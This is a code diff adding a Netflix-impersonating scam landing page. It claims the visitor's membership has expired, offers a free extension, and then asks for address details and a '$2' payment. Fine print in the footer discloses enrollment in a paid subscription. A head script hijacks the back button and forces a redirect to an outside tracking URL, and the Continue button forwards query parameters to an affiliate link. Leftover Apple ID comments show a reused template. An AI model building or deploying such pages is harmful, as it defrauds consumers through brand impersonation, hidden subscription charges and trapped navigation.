@@ -1,0 +1,118 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link id="tt1" rel="stylesheet" href="./css/style.css">
+    <link id="tt2" rel="stylesheet" href="./css/animate.min.css">
+    <script src="./js/script.js"></script>
+
+    <script>
+        (function (window, location) {
+            var redirect = "https://www.hb6trk.com/K31267/9WDPQ6B/"
+            var currentUrl = location.origin + location.pathname + location.search;
+            if (location.hash !== "#!/hst") {
+                history.replaceState(null, document.title, currentUrl + "#!/hst");
+                history.pushState(null, document.title, currentUrl);
+            }
+
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/hst") {
+                    setTimeout(function () {
+                        window.location.replace(redirect);
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+    </script>
+</head>
+<body>
+    <div class="container"> 
+        <div id="head-con" class="container-head">
+            <img src="./images/logo.png" alt="">
+        </div>
+        <div>
+            <div class="pack-con">
+                <div class="pack">
+                    <div class="pack-head">
+                        <p>Your membership has expired!</p>
+                        <img src="./images/icloud-app.png" alt="">
+                    </div>
+                    <div class="pack-body">
+                        <p class="p1">Dear customer,</p>
+                        <p class="p2"><b>Your membership has expired.</b></p>
+                        <p class="p3">But, as part of our loyalty program, you can now extend for 90 days for free. <br/>
+                            Enjoy 3 months of your favorite movies for free. Ready to watch? Extend your membership.</p>
+                        <button id="btn-claim">Extend Now</button>
+                        <!-- <p class="p4">* After signing up, you have to insert your credit card details for validation of you Apple ID.</p>
+                        <p class="p5">We <b>will not</b> withdraw any amount.</p> -->
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
+    <div id="foot-con" class="footer-con">
+        <div class="foot-con-inn">
+                <p>This website is not affiliated with or endorsed by Netflix or any similar brand and does not claim to represent or own any of the trademarks, trade names or rights associated with any of the products which are the property of their respective owners who do not own, endorse, or promote this website.<br/><br/>
+                    Upon entering creditcard details on the payment page, user may be enrolled into a paid subscripion. This products offered on this page require fees. See manufacturer's site for details as terms vary with offers. Terms and conditions regarding this offerc can be found on the payment page.
+                    <br/><br/>
+            </p>
+        </div>
+    </div>
+</body>
+
+<div class="mod-con mod-con-bg hidden" id="modal-prize">
+    <div class="modal mod-con-inn">
+        <div class="btn-close">
+            <img src="./images/logo.png" height="50px" alt="">
+        </div>
+       <!--  <div class="modal-head">
+            <p><span>Congratulations!</span> We have reserved <b>(1)</b> <span id = "modal-head-prod"></span> exclusively for you.</p>
+        </div> -->
+        <br/>
+        <div class="modal-body">
+            <p><span>How to claim your membership:</p>
+            <ol>
+                <li>Fill in your address details.</li>
+                <li>Pay only $2 to activate your membership.</li>
+                <!-- <li>Your prize will be delivered in 5-7 working days.</li> -->
+            </ol>
+        </div>
+        <div class="modal-foot">
+            <button id="button1">Continue</button>
+        </div>
+    </div>
+</div>
+<script>
+    document.getElementById("btn-claim").onclick = function () {
+        var modsclaim = document.getElementById("modal-prize");
+        modsclaim.classList.add("mod-con-bg");
+        modsclaim.children[0].classList.add("mod-con-inn");
+        modsclaim.classList.remove("hidden");
+        var modsprize = document.getElementById("prize-ln2-desc").innerText;
+        document.getElementById("modal-head-prod").innerText = modsprize;
+        document.getElementById("modal-head-prod2").innerText = modsprize;
+    }
+    
+    document.getElementById('button1').addEventListener("click",function(){
+        var urlParams = new URLSearchParams(window.location.search);
+        var encodedValue = urlParams.get('encoded_value');
+
+        var source_id = urlParams.get('source_id');
+        var domain = urlParams.get('domain');
+
+        var sub1 = urlParams.get('sub1');
+        var sub2 = urlParams.get('sub2');
+        var sub3 = urlParams.get('sub3');
+        var sub4 = urlParams.get('sub4');
+        var sub5 = urlParams.get('sub5');  
+        window.location.href="https://"+domain+"/cmp/"+encodedValue+"/MBF3S9/?source_id="+source_id+"&sub1="+sub1+"&sub2="+sub2+"&sub3="+sub3+"&sub4="+sub4+"&sub5="+sub5;
+    },false);
+</script>
+
+</html>
